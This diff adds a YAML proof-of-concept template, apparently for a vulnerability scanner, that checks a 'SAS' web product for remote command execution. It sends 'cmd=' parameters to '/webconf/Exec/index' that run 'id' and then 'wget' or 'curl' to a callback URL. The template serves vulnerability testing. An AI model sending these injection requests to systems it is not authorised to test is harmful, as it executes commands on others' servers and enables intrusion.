@@ -1,0 +1,30 @@
+name: poc-yaml-sas-exec-cmd
+manual: true
+transport: http
+set:
+    reverse: newReverse()
+    reverseURL: reverse.url
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /webconf/Exec/index?cmd=id
+            follow_redirects: false
+        expression: response.status == 200 && response.body_string.icontains("WEBSVC OK")
+    r1:
+        request:
+            cache: true
+            method: GET
+            path: /webconf/Exec/index?cmd=wget%20{{reverseURL}}
+            follow_redirects: false
+        expression: response.status == 200 && reverse.wait(6)
+    r2:
+        request:
+            cache: true
+            method: GET
+            path: /webconf/Exec/index?cmd=curl%20{{reverseURL}}
+            follow_redirects: false
+        expression: response.status == 200 && reverse.wait(6)
+expression: r0() || r1() || r2()
+detail: {}
